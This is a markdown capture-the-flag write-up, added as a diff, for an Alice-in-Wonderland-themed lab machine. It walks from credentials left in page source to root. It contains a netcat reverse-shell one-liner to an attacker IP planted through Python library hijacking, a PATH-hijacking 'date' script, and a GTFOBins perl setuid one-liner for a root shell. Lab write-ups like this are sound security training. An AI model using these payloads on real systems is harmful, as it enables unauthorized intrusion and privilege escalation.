@@ -1,0 +1,68 @@
+basic enumeration didnt show much
+
+first step was to find credentials at the end of 
+
+`http://machineip/r/a/b/b/i/t/` 
+
+in the source code
+
+this allowed me to log into the machine as alice through ssh
+
+alice had an option to use sudo as user rabbit, and it was python together with a predefined script in alices home dir
+
+[Privilege Escalation via Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)
+
+using this and other resources, all that was needed done was 
+
+creating a py script in the same directory:
+
+```
+import os
+def choice(a):
+  os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.17.253 1337>/tmp/f")
+```
+
+after running a listener and executing
+
+`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
+
+gets us a shell as rabbit 
+
+in rabbits home directory there was a precompiled C program called teaParty, that had some functionality. After getting the binary and decompiling it using `**ghidra`** it turned out its calling for a program called ‘date’ without a predefined PATH, which allows us to create a malicious script called ‘date’, and placing it somewhere in path before the actual ‘date’ binary
+
+[Path Interception by Search Order Hijacking](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/untitled-5/path-interception-by-search-order-hijacking)
+
+  
+
+malicious script:
+
+```
+#!/bin/sh
+bash -i
+```
+
+`cd /tmp` 
+
+`mkdir /bin` 
+
+`cd bin`
+
+`nano date`
+
+`(above script)`
+
+`chmod 777 date`
+
+`export PATH=/tmp/bin:<other directories>:$PATH` 
+
+after executing ./teaParty we get a shell owned by **hatter**
+
+hatter has his credentials written down inside his home directory, which allows us to log in through ssh 
+
+after running `getcap -r / 2> /dev/null` we discover that perl has a capability set, which we can conveniently exploit with this oneliner from GTFO bins
+
+`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
+
+(this was known earlier, but only root and hatter could execute perl)
+
+this gets us a root shell and ends this challenge
